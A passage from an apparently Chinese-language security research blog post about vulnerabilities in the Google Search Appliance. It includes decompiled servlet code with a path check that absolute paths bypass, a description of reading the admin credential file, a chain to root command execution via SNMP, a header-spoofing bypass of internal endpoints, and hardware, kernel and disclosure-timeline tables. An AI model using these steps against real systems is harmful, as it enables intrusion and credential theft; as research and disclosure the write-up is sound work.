&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;發現此類別是繼承自 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt;，跟進此類別：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以發現此處只有檢查字串是否含有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt; ，但我們可以直接指定絕對路徑。
並直接讀取本機任意檔案！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;舊版GSA 沒有 /font 這個端點，但 /dps/admin 有類似的讀檔問題，可以直接指定 logName 進行檔案讀取，
可參考下圖直接讀取系統管理介面帳號密碼檔：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;成功破解雜湊後，登入後可以開啟 SNMP 服務配合第一個漏洞並以 root 權限執行任意指令。&lt;/p&gt;

&lt;h3 id=&quot;其他發現跟整理&quot;&gt;其他發現跟整理&lt;/h3&gt;

&lt;h4 id=&quot;服務本身內部網址&quot;&gt;服務本身內部網址&lt;/h4&gt;
&lt;p&gt;GSA 中有許多的子服務間使用 HTTP 傳輸協定溝通，而在許多服務都有提供 /varz、/helpz、/procz 等網址，
可以在服務定義的信任網路位置或 127.0.0.1 中存取：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而在 vGSA 中觀察到服務執行參數有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useripheader=X-User-Ip&lt;/code&gt; ，導致對外開放的管理介面可以帶入 X-User-IP 請求頭後直接存取此功能：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;/procz 端點甚至可以抓取執行檔及使用到的共享函示庫：
&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;型號整理&quot;&gt;型號整理&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;型號&lt;/th&gt;
      &lt;th&gt;製造商及型號&lt;/th&gt;
      &lt;th&gt;硬體規格&lt;/th&gt;
      &lt;th&gt;版號&lt;/th&gt;
      &lt;th&gt;文件數量&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;3.4.14&lt;/td&gt;
      &lt;td&gt;300,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini-002X&lt;/td&gt;
      &lt;td&gt;SuperMicro&lt;/td&gt;
      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
      &lt;td&gt;5.0.0&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1001&lt;/td&gt;
      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;3,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1002&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-7007&lt;/td&gt;
      &lt;td&gt;Dell R710&lt;/td&gt;
      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;10,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-9009&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;30,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G100&lt;/td&gt;
      &lt;td&gt;Dell R720XD&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G500&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;核心版本&quot;&gt;核心版本&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;GSA 版本&lt;/th&gt;
      &lt;th&gt;核心版本&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7.6.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.4.0&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.0.14&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;時間軸&quot;&gt;時間軸&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;時間&lt;/th&gt;
      &lt;th&gt;事件&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2005/06/10&lt;/td&gt;
      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; 被 H D Moore 回報&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008 上半年&lt;/td&gt;
      &lt;td&gt;釋出 GSA 5.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008/10/28&lt;/td&gt;
      &lt;td&gt;釋出 vgsa_20081028.7z (5.2.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2013/04/20&lt;/td&gt;
      &lt;td&gt;釋出 GSA 6.14.0.G28&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/03/20&lt;/td&gt;
      &lt;td&gt;XSS 漏洞 &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; 被 Will Dormann 回報&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/01&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.0.14.G238&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/03&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.2.0.G252&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/12/12&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.2.0.G264&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/02/07&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.2.0.G270&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/15&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.4.0.G64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/22&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.4.0.G72&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/30&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.4.0.G74&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/06/04&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.4.0.G82&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016 上半年&lt;/td&gt;
      &lt;td&gt;Google 宣布 GSA 將會逐步退出市場&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/01/05&lt;/td&gt;
      &lt;td&gt;XML 外部實體攻擊 &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; 被 Timo 回報&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/05/24&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.0.G36&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/01&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.0.G42&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/31&lt;/td&gt;
      &lt;td&gt;本文作者取得此設備，版本為 7.0.14&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/08/25&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.0.G46&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/10/21&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.0.G58&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/01/19&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.50.G30&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/04/19&lt;/td&gt;
